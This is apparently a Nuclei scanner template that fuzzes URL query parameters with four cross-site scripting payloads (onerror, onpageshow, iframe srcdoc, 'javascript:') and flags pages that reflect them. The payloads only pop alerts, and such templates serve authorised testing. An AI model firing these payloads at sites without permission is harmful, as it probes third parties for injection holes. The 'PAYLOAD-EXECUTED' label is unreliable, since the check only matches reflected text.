id: nawab-smart-xss-fuzzer

info:
  name: ⚡ Nawab-Smart-XSS-Fuzzer ⚡
  author: thenawabx
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      xss_payloads:
        - "<video><source/onerror=confirm(1)>"
        - "<body/onpageshow=alert?.(1)>"
        - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
        - "j[\\s\\n]*avascript:alert(1)"

    fuzzing:
      - part: query
        type: replace
        mode: multiple
        fuzz:
          - "{{xss_payloads}}"

    matchers-condition: or
    matchers:
      - type: regex
        name: "⚡⚡ [FOUND] XSS-VULNERABLE: PAYLOAD-EXECUTED ⚡⚡"
        regex:
          - "(?i)(<video><source/onerror=|<body/onpageshow=|<iframe/srcdoc=)"
        part: body

      - type: regex
        name: "⚡⚡ [FOUND] XSS-BYPASS: JAVASCRIPT-REFLECTED ⚡⚡"
        regex:
          - "(?i)j[\\s\\n]*avascript:alert"
        part: body
